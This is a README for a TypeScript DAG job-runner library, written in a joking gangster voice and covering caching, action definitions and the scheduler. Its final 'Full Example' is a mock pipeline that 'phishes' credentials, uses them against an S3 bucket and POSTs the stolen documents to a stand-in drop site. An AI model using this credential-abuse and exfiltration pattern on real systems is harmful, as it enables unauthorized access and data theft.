# dagraph

Directed Acyclic Action Graph — _da graph._

Listen up. We got jobs to do. Jobs depend on other jobs. You wire 'em into a graph, and it runs the whole thing — parallel, cached, no wasted effort. A job that already got done? We don't do it again. We check the outputs, verify the goods are still there, and move on.

## Core Concept

Everything operates on file paths. A node takes file paths in, produces file paths out. The engine doesn't care what's in them — it doesn't care if you're processing images, transcribing audio, or laundering copyrighted data into training sets. If it produces files, it fits.

- **Parallel** — independent nodes run concurrently, up to a configurable limit
- **Cached** — Merkle-based content hashing skips nodes whose inputs haven't changed
- **Type-safe** — `NodeRef<T>` prevents miswired dependencies at graph-construction time
- **Pluggable** — swap the `NodeRunner` to dispatch work locally or to remote workers

## Modules

| File               | Purpose                                                                                     |
| ------------------ | ------------------------------------------------------------------------------------------- |
| `types.ts`         | Core interfaces: `Node`, `Cache`, `CacheEntry`, `NodeRef<T>`, `ExecResult`, `Outputs`       |
| `graph.ts`         | `Graph` class: node registration, analysis, kind topology                                   |
| `execute.ts`       | `execute` function: standalone execution with `ExecutionContext` (cache, fs, CAS directory) |
| `exec-state.ts`    | Scheduler state machine: ready queue, inflight tracking, dependency fan-out                 |
| `define-action.ts` | `defineAction` factory: binds context, params, and config into a reusable action definition |
| `cache.ts`         | `MemCache`, `FsCache` (filesystem-backed), `TieredCache` (local + remote with promotion)    |
| `helpers.ts`       | SHA256 hashing, output verification, cycle detection                                        |

## Nodes

Every job in da graph is a node:

```typescript
interface Node {
  name: string;
  kind: string;
  deps: string[];
  config: string;
  params: BaseParams;
  action: (rawInputs: Record<string, Outputs>, outputDir: string) => Promise<Outputs>;
}
```

`params` holds everything serializable — IDs, paths, prompts, dep refs. External dependencies (filesystem, HTTP clients, CLI tools) get bound at definition time via a context object and stay outside `params`. This means `params` can be shipped to a remote worker — the worker just needs the action registry and its own context.

`kind` groups nodes by type (`"fetch"`, `"transform"`) for aggregate counts and progress displays. Not part of the cache key.

`config` is a version tag plus any parameters that should invalidate cache when changed (e.g., `"v1"` or `"v2,model=gpt4"`). Included in the action key hash.

## Caching

Each node's **action key** is a SHA256 of:

- Its name
- Its config string
- Its dependencies' names and **content hashes** (sorted)

Content hashes come from hashing actual file contents at the output paths. This builds a Merkle tree — changes ripple downstream. The clever bit: **early cutoff**. If a node re-runs but produces identical output, the content hash doesn't change. Downstream nodes stay cached even though their action key shifted.

On a cache hit, `verifyOutputs` re-hashes the cached file paths. If any file is missing or corrupted, the node runs again. Trust, but verify.

Three implementations:

- **`MemCache`** — in-memory `Map`. Gone when the process sleeps with the fishes.
- **`FsCache`** — filesystem-backed. Stores manifests as JSON under a base directory. Survives between runs.
- **`TieredCache`** — checks local first, then remote. Promotes remote hits to local on read.

Implement the `Cache` interface to bring your own:

```typescript
interface Cache {
  get(key: string): Promise<CacheEntry | undefined>;
  put(key: string, entry: CacheEntry): Promise<void>;
}

interface CacheEntry {
  outputs: Outputs;
  contentHash: string;
}
```

## Defining Actions

`defineAction` separates naming, cache config, and execution into one spec:

```typescript
const resize = defineAction<Ctx, ResizeParams, string>({
  name: (p) => `resize:${p.imageId}`,
  config: "v1",
  action: (ctx) => async (params, inputs, outputDir) => {
    const outPath = `${outputDir}/resized.jpg`;
    await ctx.imageLib.resize(inputs.source, outPath);
    return outPath;
  },
});
```

First type parameter (`Ctx`) is the context type — whatever external dependencies your actions need. The `config` field can be a string or an object (objects get JSON-stringified). Change the config, the cache is dead for that action.

Params declare dependencies with `NodeRef<T>`:

```typescript
interface ResizeParams {
  kind: "resize";
  imageId: string;
  deps: { source: NodeRef<string> };
}
```

`InputsFor<P>` derives typed inputs from the `deps` record. Inside the action, `inputs.source` is the output type of the referenced node. The framework rekeys from node names (`"fetch:img_001"`) to role names (`"source"`) automatically.

The returned `ActionDef` has an `addNode` method:

```typescript
resize.addNode(graph, ctx, params); // returns NodeRef<string>
```

## Analysis

`graph.analyze()` validates da graph (cycle detection) and returns the layout:

```typescript
const analysis = graph.analyze();
// analysis.total   → 14
// analysis.byKind  → Map { "fetch" => 2, "transform" => 5, ... }
// analysis.nodes   → Node[]
```

## Execution

```typescript
import { execute } from "@podpiper/dagraph";

const results = await execute(graph, executionCtx, localRunner, {
  maxParallelism: 4,
  onAction: (action) => {
    /* progress reporting */
  },
});
```

The executor is a readiness-loop state machine:

1. `createExecState` seeds the ready queue with zero-dep leaf nodes
2. The loop pops nodes via `takeNext`, checks cache (with output verification), runs the action or skips on cache hit / dep failure
3. On completion, newly-ready children get pushed to the **front** of the queue (`unshift`) — a fetch finishes, its dependent transform starts immediately instead of waiting behind queued fetches from other subgraphs
4. Continues while work remains (ready > 0 or inflight > 0), dispatching up to `maxParallelism` concurrent nodes

Execution goes through a pluggable `NodeRunner`. The default `localRunner` calls `node.action(inputs, outputDir)` directly. Swap in your own to dispatch work to remote workers.

Every state transition emits an `ExecAction` to the `onAction` callback:

| Action        | When                                                                         |
| ------------- | ---------------------------------------------------------------------------- |
| `start`       | Node begins executing                                                        |
| `success`     | Node completed successfully (includes outputs, contentHash, elapsed time)    |
| `failure`     | Node threw an error                                                          |
| `cache-hit`   | Node skipped — cached outputs verified intact                                |
| `dep-failure` | Node skipped because an upstream dependency failed                           |
| `complete`    | Node fully done (after success/failure/cache-hit) — triggers child promotion |

Results are a discriminated union per node:

```typescript
type ExecResult = { name: string; actionKey: string } & (
  | { status: "done"; outputs: Outputs; contentHash: string }
  | { status: "cached"; outputs: Outputs; contentHash: string }
  | { status: "fail"; error: Error }
  | { status: "dep-failed"; error: Error }
);
```

## Full Example

```typescript
import { defineAction, execute, Graph, MemCache, type NodeRef } from "@podpiper/dagraph";

interface PhishParams {
  kind: "phish";
  target: string;
}

const sendPhishingEmail = defineAction<{}, PhishParams, string>({
  name: (p) => `phish:${p.target}`,
  config: "v1",
  action: () => async (params, _inputs, outputDir) => {
    const outPath = `${outputDir}/credentials.json`;
    const response = await (await globalThis.fetch(params.target)).text();
    await Bun.write(outPath, response);
    return outPath;
  },
});

interface ScrapeParams {
  kind: "scrape";
  bucket: string;
  deps: { credentials: NodeRef<string> };
}

const scrapeTheirDrive = defineAction<{}, ScrapeParams, string>({
  name: (p) => `scrape:${p.bucket}`,
  config: "v1",
  action: () => async (params, inputs, outputDir) => {
    const outPath = `${outputDir}/stolen-docs.json`;
    const creds = JSON.parse(await Bun.file(inputs.credentials).text());
    // use their own API keys against them
    const docs = await (
      await globalThis.fetch(`https://${params.bucket}.s3.amazonaws.com`, {
        headers: { Authorization: creds.token },
      })
    ).text();
    await Bun.write(outPath, docs);
    return outPath;
  },
});

interface ExfilParams {
  kind: "exfil";
  dropsite: string;
  deps: { docs: NodeRef<string> };
}

const exfiltrate = defineAction<{}, ExfilParams, string>({
  name: (p) => `exfil:${p.dropsite}`,
  config: "v1",
  action: () => async (params, inputs, outputDir) => {
    const outPath = `${outputDir}/receipt.json`;
    const loot = await Bun.file(inputs.docs).text();
    await globalThis.fetch(params.dropsite, { method: "POST", body: loot });
    await Bun.write(outPath, JSON.stringify({ status: "gone", bytes: loot.length }));
    return outPath;
  },
});

// Build da graph
const graph = new Graph();

const credsRef = sendPhishingEmail.addNode(
  graph,
  {},
  {
    kind: "phish",
    target: "https://definitely-real-hr-portal.biz/reset-password",
  },
);
const docsRef = scrapeTheirDrive.addNode(
  graph,
  {},
  {
    kind: "scrape",
    bucket: "acme-corp-totally-not-public",
    deps: { credentials: credsRef },
  },
);
exfiltrate.addNode(
  graph,
  {},
  {
    kind: "exfil",
    dropsite: "https://legit-file-sharing.ru/upload",
    deps: { docs: docsRef },
  },
);

// Send 'em in
const results = await execute(graph, {
  cache: new MemCache(),
  fs: dagFs,
  casBaseDir: "/tmp/safehouse",
});
```
